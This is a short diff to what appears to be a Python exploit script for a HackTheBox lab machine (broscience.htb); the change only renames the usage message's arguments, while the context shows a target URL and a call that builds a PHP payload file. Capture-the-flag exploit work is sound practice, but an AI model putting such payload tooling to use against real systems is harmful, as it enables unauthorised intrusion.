@@ -33,7 +33,7 @@ url = "https://broscience.htb/user.php?id=6"
 ai = 'payload_avatar.php'
 
 if len(sys.argv) < 3:
-    print(f"Usage: {sys.argv[0]} <tmpPath> <>")
+    print(f"Usage: {sys.argv[0]} <to_file_path> <from_server_path>")
     sys.exit(1)
 
 os.system(f'php ./{ai} {sys.argv[1]} {sys.argv[2]} > payload')
